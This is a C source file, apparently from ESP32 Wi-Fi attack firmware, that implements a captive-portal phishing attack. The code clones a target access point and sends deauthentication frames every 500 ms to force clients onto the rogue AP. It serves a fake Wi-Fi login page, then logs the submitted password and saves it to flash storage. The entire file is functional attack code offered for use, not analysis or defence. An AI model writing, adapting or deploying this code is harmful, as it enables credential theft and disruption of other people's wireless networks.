/**
 * @file attack_phishing.c
 * @brief Implements Captive Portal Phishing attack
 * 
 * Clones the target AP, deauths clients from real AP, and serves a 
 * captive portal login page to capture credentials.
 */
#include "attack_phishing.h"

#include <string.h>
#include <stdlib.h>

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "lwip/err.h"
#include "lwip/sys.h"
#include "lwip/netdb.h"
#include "lwip/dns.h"
#include "esp_http_server.h"
#include "nvs_flash.h"
#include "nvs.h"

#include "attack.h"
#include "wifi_controller.h"
#include "wsl_bypasser.h"
#include "attack_method.h"

static const char *TAG = "main:attack_phishing";

static httpd_handle_t phishing_httpd = NULL;
static esp_timer_handle_t deauth_timer = NULL;
static const wifi_ap_record_t *target_ap = NULL;
static char captured_password[128] = {0};

// Captive Portal HTML
static const char *PHISHING_HTML = 
"<!DOCTYPE html><html><head>"
"<meta name='viewport' content='width=device-width,initial-scale=1'>"
"<style>"
"*{box-sizing:border-box;margin:0;padding:0;font-family:sans-serif}"
"body{background:#1a1a2e;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}"
".card{background:#16213e;padding:30px;border-radius:16px;width:90%%;max-width:350px;box-shadow:0 10px 40px rgba(0,0,0,.5)}"
"h2{text-align:center;margin-bottom:20px;color:#e94560}"
"input{width:100%%;padding:12px;margin:10px 0;border:1px solid #0f3460;border-radius:8px;background:#0f3460;color:#fff}"
"button{width:100%%;padding:14px;margin-top:15px;background:#e94560;border:none;border-radius:8px;color:#fff;font-weight:bold;cursor:pointer}"
".logo{text-align:center;font-size:2em;margin-bottom:15px}"
"</style></head><body>"
"<div class='card'>"
"<div class='logo'>🌐</div>"
"<h2>WiFi Authentication</h2>"
"<form action='/login' method='post'>"
"<input type='text' name='user' placeholder='Username or Email'>"
"<input type='password' name='pass' placeholder='Password' required>"
"<button type='submit'>Connect</button>"
"</form>"
"<p style='text-align:center;margin-top:15px;font-size:.8em;color:#888'>Network requires authentication</p>"
"</div></body></html>";

static const char *SUCCESS_HTML = 
"<!DOCTYPE html><html><head>"
"<meta name='viewport' content='width=device-width,initial-scale=1'>"
"<style>body{background:#1a1a2e;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif}"
".msg{text-align:center}h1{color:#4CAF50}p{color:#888}</style></head><body>"
"<div class='msg'><h1>✓ Connected</h1><p>You may now use the network.</p></div></body></html>";

/**
 * @brief Handler for the root page - shows the phishing form
 */
static esp_err_t portal_get_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, PHISHING_HTML, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

/**
 * @brief Handler for login POST - captures credentials
 */
static esp_err_t login_post_handler(httpd_req_t *req) {
    char buf[256] = {0};
    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (ret > 0) {
        ESP_LOGI(TAG, "=== CAPTURED CREDENTIALS ===");
        ESP_LOGI(TAG, "Raw: %s", buf);
        
        // Parse password from form data
        char *pass_start = strstr(buf, "pass=");
        if (pass_start) {
            pass_start += 5;
            char *pass_end = strchr(pass_start, '&');
            if (pass_end) *pass_end = '\0';
            strncpy(captured_password, pass_start, sizeof(captured_password) - 1);
            ESP_LOGI(TAG, "Password: %s", captured_password);
        }
        
        // Store in NVS for persistence
        nvs_handle_t nvs;
        if (nvs_open("phishing", NVS_READWRITE, &nvs) == ESP_OK) {
            nvs_set_str(nvs, "last_pass", captured_password);
            nvs_commit(nvs);
            nvs_close(nvs);
        }
        
        // Update attack result
        attack_append_status_content((uint8_t *)captured_password, strlen(captured_password));
    }
    
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, SUCCESS_HTML, HTTPD_RESP_USE_STRLEN);
    
    // Signal attack completed
    attack_update_status(FINISHED);
    
    return ESP_OK;
}

/**
 * @brief DNS hijack - redirects all requests to captive portal
 * Note: Simplified redirect, actual DNS hijack would require more work
 */
static esp_err_t captive_redirect_handler(httpd_req_t *req) {
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

/**
 * @brief Timer callback for periodic deauth during phishing
 */
static void phishing_deauth_callback(void *arg) {
    if (target_ap != NULL) {
        wsl_bypasser_send_deauth_frame(target_ap);
    }
}

/**
 * @brief Starts the phishing HTTP server
 */
static void start_phishing_server(void) {
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.lru_purge_enable = true;
    config.max_uri_handlers = 8;
    
    if (httpd_start(&phishing_httpd, &config) == ESP_OK) {
        // Register handlers
        httpd_uri_t root = { .uri = "/", .method = HTTP_GET, .handler = portal_get_handler };
        httpd_uri_t login = { .uri = "/login", .method = HTTP_POST, .handler = login_post_handler };
        httpd_uri_t redirect = { .uri = "/generate_204", .method = HTTP_GET, .handler = captive_redirect_handler };
        httpd_uri_t redirect2 = { .uri = "/hotspot-detect.html", .method = HTTP_GET, .handler = captive_redirect_handler };
        
        httpd_register_uri_handler(phishing_httpd, &root);
        httpd_register_uri_handler(phishing_httpd, &login);
        httpd_register_uri_handler(phishing_httpd, &redirect);
        httpd_register_uri_handler(phishing_httpd, &redirect2);
        
        ESP_LOGI(TAG, "Phishing server started");
    }
}

void attack_phishing_start(attack_config_t *attack_config) {
    ESP_LOGI(TAG, "Starting Captive Portal attack...");
    
    target_ap = attack_config->ap_record;
    memset(captured_password, 0, sizeof(captured_password));
    
    // Clone the target AP (use rogue AP method)
    ESP_LOGI(TAG, "Cloning target AP: %s", target_ap->ssid);
    attack_method_rogueap(target_ap);
    
    // Start phishing server
    start_phishing_server();
    
    // Start periodic deauth to push clients to our rogue AP
    const esp_timer_create_args_t timer_args = {
        .callback = &phishing_deauth_callback,
        .name = "phish_deauth"
    };
    ESP_ERROR_CHECK(esp_timer_create(&timer_args, &deauth_timer));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer, 500000)); // Every 500ms
    
    ESP_LOGI(TAG, "Captive Portal attack started - waiting for victim...");
}

void attack_phishing_stop(void) {
    ESP_LOGI(TAG, "Stopping Captive Portal attack...");
    
    // Stop deauth timer
    if (deauth_timer != NULL) {
        esp_timer_stop(deauth_timer);
        esp_timer_delete(deauth_timer);
        deauth_timer = NULL;
    }
    
    // Stop phishing server
    if (phishing_httpd != NULL) {
        httpd_stop(phishing_httpd);
        phishing_httpd = NULL;
    }
    
    // Restore management AP
    wifictl_mgmt_ap_start();
    wifictl_restore_ap_mac();
    
    target_ap = NULL;
    ESP_LOGI(TAG, "Captive Portal attack stopped");
}
